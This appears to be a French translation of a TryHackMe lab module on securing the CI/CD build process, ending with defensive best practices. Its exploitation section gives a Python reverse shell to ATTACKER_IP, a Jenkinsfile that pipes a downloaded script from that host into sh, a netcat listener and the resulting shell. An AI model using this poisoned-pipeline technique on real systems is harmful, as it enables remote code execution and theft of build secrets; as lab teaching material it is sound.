Maintenant que nous avons prêté attention à la protection de la source de construction de notre pipeline, la prochaine étape de notre parcours consiste à nous assurer que le processus de construction lui-même n'a pas de mauvaises configurations pouvant conduire à des compromis.

Gestion des Dépendances

La première étape pour sécuriser le processus de construction consiste à sécuriser les dépendances de la construction. À mesure que notre pipeline démarre, il commencera par compiler notre code source dans la version finale. Cependant, notre code source peut dépendre de bibliothèques externes et de SDK pour sa fonctionnalité. Ainsi, au cours de ce processus de compilation, le pipeline de build rassemblera ces dépendances pour effectuer la build. Il y a deux préoccupations principales pour notre processus de construction en ce qui concerne les dépendances:

-   Supply Chain Attacks - Si un acteur de la menace peut prendre en charge l'une de ces dépendances, ils seraient en mesure d'injecter du code malveillant dans la construction
-   Confusion de dépendance - Si une dépendance développée en interne est utilisée, un attaquant pourrait tenter une attaque de confusion de dépendance pour injecter du code dans le processus de construction lui-même.

Ces deux attaques ont déjà été couvertes par le [Salle de gestion Dépendance](http://tryhackme.com/jr/dependencymanagement) si vous voulez en savoir plus et exploiter pratiquement ces attaques. Dans cette tâche, nous nous concentrerons sur une mauvaise configuration dans le processus de construction lui-même.

Savoir Quand Commencer la Construction

Un gros problème avec les pipelines et le processus de construction est que, en un mot, que vous aimiez l'entendre ou non, c'est l'exécution de code à distance en tant que fonctionnalité. Une fois qu'un pipeline démarre, le serveur de compilation communique avec l'un des agents de compilation pour effectuer la compilation, ce qui inclut la lecture des commandes qui doivent être exécutées à partir du CI les classer et les exécuter. Bien que cela crée une automatisation, cela crée également le risque que si un attaquant peut modifier ce qui est construit ou quand, il pourrait tirer parti de cette exécution de code pour compromettre les systèmes. Par conséquent, nous devons accorder une attention particulière aux points suivants:

-   Quelles actions permettons-nous de lancer le processus de construction?
-   Qui a la permission d'effectuer ces actions pour lancer le processus de construction?
-   Où se déroulera le processus de construction?

Les réponses à ces questions peuvent vous aider à déterminer la surface d'attaque de votre pipeline. Bien que, dans la plupart des cas, une mauvaise réponse à l'une de ces questions ne compromette ni la construction ni le pipeline, il existe certaines combinaisons toxiques dont vous devez être conscient. Examinons de plus près ces trois questions.

**Quelles actions démarrent le processus de construction**

Nous avons la capacité de décider quelles actions peuvent démarrer le processus de construction. Normalement, par défaut, un commit de nouveau code vers la source démarrera le pipeline. Mais nous avons la capacité de fournir une configuration beaucoup plus granulaire. Par exemple, nous pouvons décider que seuls les commits sur des branches spécifiques, telles que main, devraient démarrer le pipeline. Cette configuration signifie que nous pouvons, avec beaucoup plus de tranquillité d'esprit, permettre aux développeurs de faire des commits directs à d'autres branches. Tant que nous limitons qui a la capacité de s'engager directement dans la branche principale ou d'approuver les demandes de fusion pour cela, nous pouvons limiter la surface d'attaque de notre pipeline.

Cependant, cela pourrait nous amener à résoudre le problème où ces demandes de fusion se brisent dans le pipeline, nous obligeant à effectuer plusieurs fusions juste pour résoudre le problème, ce qui peut être fastidieux. Par conséquent, il peut y avoir un cas d'utilisation pour que le processus de construction commence déjà sur d'autres branches ou lorsque de nouvelles demandes de fusion sont faites pour indiquer si la demande de fusion casserait notre pipeline. Si nous choisissons de suivre cette voie, nous devons comprendre que notre surface d'attaque a augmenté car plusieurs actions pourraient démarrer le processus de construction. Rien à craindre pour l'instant, mais nous devons nous assurer que ces actions ne peuvent pas être effectuées simplement par n'importe qui!

**Qui peut démarrer le processus de construction**

Une fois que nous avons décidé quelles actions peuvent démarrer le processus de construction, nous devons déterminer qui peut effectuer ces actions. Comme mentionné précédemment, le pipeline ne s'exécute que lorsque le code est fusionné à la branche principale; cela peut être une très petite liste d'utilisateurs qui ont la capacité d'approuver ces fusions. La question devient plus compliquée si nous permettons aux builds de se lancer dans d'autres actions. Sur la base des actions (et des branches) qui peuvent démarrer la construction, nous devrons demander qui peut la démarrer et les ajouter à la liste, augmentant ainsi la surface d'attaque. Par exemple, si nous autorisons les builds à démarrer sur les demandes de fusion elles-mêmes, nous devons nous assurer que l'attaquant ne peut pas faire une demande de fusion ou que la construction de fusion se produira dans un environnement séparé.

**Où la construction se produira**

Enfin, nous devons décider où la construction aura lieu. Nous n'avons pas besoin de simplement compter sur un seul agent de construction pour effectuer toutes nos constructions. Dans l'exemple ci-dessus, si nous voulons que les développeurs exécutent des builds sur d'autres branches, nous pouvons simplement enregistrer un nouvel agent de construction qui exécutera une construction dans un environnement différent de celui de la branche principale. Sur la base de nos réponses aux deux questions précédentes, nous devrons peut-être nous assurer que nous sécurisons où la construction s'exécutera. Si nous autorisons plusieurs actions à démarrer la construction, nous voulons probablement nous assurer que le même agent de construction n'est pas utilisé pour toutes ces actions, car elles ont des degrés de sensibilité différents.

Maintenant que nous comprenons les trois questions auxquelles nous devons répondre, explorons une combinaison toxique très intéressante mais commune!

Exploiter une Fusion Build

Une combinaison toxique commune est appelée On-Merge. Jetons un coup d'œil au README laissé dans le repo d'Ash Android (<http://gitlab.tryhackme.loc/ash/Merge-Test>'):

![c3d77fd5295a61972645e7b1cd5785c4](https://github.com/user-attachments/assets/becb2b3b-2c39-4f82-9015-39db16179b58)

Il semble que Ash se lasse des utilisateurs qui font des demandes de fusion à son code, seulement pour qu'il casse ses pipelines! Pour lutter contre cela, il a activé les builds on-merge. Cela signifie qu'une compilation sera exécutée pour tester le code de fusion dès qu'une demande de fusion est effectuée. C'est une configuration très courante. Certains logiciels CI/CD, tels que Jenkins, l'activent par défaut! Le problème, cependant, est que cela pourrait conduire à un compromis. Voyons comment tirer parti de cela pour compromettre un agent de construction et quelques secrets!

En examinant le code source, nous voyons qu'Ash utilise un fichier Jenkins. Ceci est un CI/Crity CD qui sera exécuté par Jenkins par un webhook. En effet, lorsque certaines actions sont effectuées, telles qu'une demande de fusion est ouverte ou que du code est poussé vers une branche, Gitlab en informera Jenkins du changement à travers un webhook. Jenkins extraireait alors le code source et exécuterait les étapes répertoriées dans le fichier Jenkins avant de fournir un retour à Gitlab sur le résultat de la construction.

Mais c'est aussi ce qui crée le problème. Si une demande de fusion va être construite et que n'importe quel utilisateur peut modifier à la fois le code source et le fichier Jenkins CI/CD, vous pouvez, cela signifie que les utilisateurs peuvent amener l'agent de construction à créer du code malveillant. Pour effectuer ce processus, nous devrons d'abord bifurquer le repo d'Ash. Accédez au dépôt et appuyez sur l'option Fourche:

![e10e1413b8ac41c5a84443a2cb38bd65](https://github.com/user-attachments/assets/9f2b6946-4e63-4a7c-8ecd-a5bce94b4755)

Forking va créer une copie du projet. Sélectionnez votre espace de noms, marquez le projet comme Privé et sélectionnez Projet Fork:

![62782c4148e9f1c3bc46a34702049b98](https://github.com/user-attachments/assets/a6c9a30f-186e-43c4-aaaf-ef0bfc1e5910)

Bien qu'il existe plusieurs façons d'exploiter la construction de la fusion, nous nous concentrerons sur la méthode la plus simple, qui consiste à modifier le fichier Jenkins. CI/Les pipelines /CD ne sont souvent que l'exécution de code en tant que fonctionnalité, et nous pouvons en tirer parti en mettant à jour le fichier Jenkins pour simplement exécuter un shell pour nous! Il y a plusieurs façons de le faire; si vous vous sentez à l'aise, vous pouvez jouer seul. Nous suivrons une approche plus lente pour nous assurer d'obtenir des commentaires Jenkins serveur pendant que la build s'exécute. Pour ce faire, nous allons d'abord créer un simple fichier shell inversé:

**shell.sh**

```
/usr/bin/python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("ATTACKER_IP",8081)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
```

Assurez-vous de modifier ATTACKER_IP pour être votre VPN ou AttackBox IP. Vous pouvez maintenant héberger ce fichier avec un simple serveur web Python en utilisant `python3 -m http.server 8080` et nous pouvons créer un auditeur en utilisant `nc -lvp 8081`. Cliquez sur le fichier Jenkins, puis sur Modifier, et remplacez votre fichier Jenkins par le code suivant:

**Jenkinsfile**

```
pipeline {
    agent any
    stages {
       stage('build') {
          steps {
              sh '''
                    curl http://ATTACKER_IP:8080/shell.sh | sh
                '''
              }
          }
       }
    }
```

Une fois que vous avez effectué la modification, validez les modifications. Pour que Jenkins exécute notre fichier Jenkins maintenant malveillant, nous devons créer une demande de fusion:

![cc884baa3ca5695ade221851e2b67e9f](https://github.com/user-attachments/assets/650d3326-625f-479d-93b2-dfec6c55cc13)

Créez la demande de fusion, ajoutez une description et cliquez sur Créer. Si vous avez terminé toutes les étapes en quelques secondes, vous devriez voir un appel à votre serveur Web pour télécharger le shell et, peu de temps après, vous devriez, une nouvelle connexion shell sur le terminal!

**Terminal**

```
root@AttackBox:~$ nc -lvp 8081
Listening on 0.0.0.0 8081
Connection received on jenkins.tryhackme.loc 55994
/bin/sh: 0: can't access tty; job control turned off
$ whoami
ubuntu
```

**Remarque: Si vous avez fait une erreur quelque part dans le processus, vous devrez soumettre une nouvelle demande de fusion afin d'obtenir votre shell. Cependant, il doit s'agir d'une demande de fusion complètement nouvelle pour que le webhook se déclenche. En tant que tel, l'option la plus simple est de supprimer complètement votre copie fourchue et de recommencer. Pour ce faire, accédez à votre fichier forked-repo, puis accédez à Paramètres -> Advanced -> Delete Project. Une fois supprimé, vous pouvez bifurquer le dépôt à nouveau et recommencer.**

Protéger le processus de construction

La protection du processus de construction est essentielle pour éviter les vulnérabilités au début du cycle de vie du code. Une construction non sécurisée peut permettre des attaques hors-terre, des attaques de la chaîne d'approvisionnement et beaucoup de problèmes difficiles à détecter plus tard dans le pipeline. Voici quelques bonnes pratiques à suivre, qui unissent ce qui a été discuté dans les tâches précédentes:

1.  **Isolation et Containerisation**: Exécutez des builds dans des conteneurs isolés pour éviter les interférences et maintenir la cohérence.
2.  **Moins Privilège**: Accorder des autorisations minimales à CI/CD outils, limitant l'accès inutile aux ressources sensibles.
3.  **Gestion Secrète**: Utilisez les fonctionnalités de gestion secrète des outils CI/CD pour stocker et injecter des données sensibles en toute sécurité.
4.  **Immuables Artifacts**: Stockez les artefacts de construction dans un registre sécurisé pour empêcher la falsification et permettre un audit facile.
5.  **Dépendance Scanning**: Intégrer l'analyse des dépendances pour identifier et corriger les vulnérabilités dans les bibliothèques tierces.

6.  **Pipeline comme Code**: Définir CI/CD pipelines en tant que code, version contrôlée à côté du code source.

7.  **Mises à jour Régulières**: Conserver CI/CD outils et dépendances à jour pour résoudre les vulnérabilités connues.
8.  **Enregistrement et Surveillance**: Surveillez les journaux de construction pour les activités inhabituelles et intégrez-les aux systèmes de surveillance de sécurité.
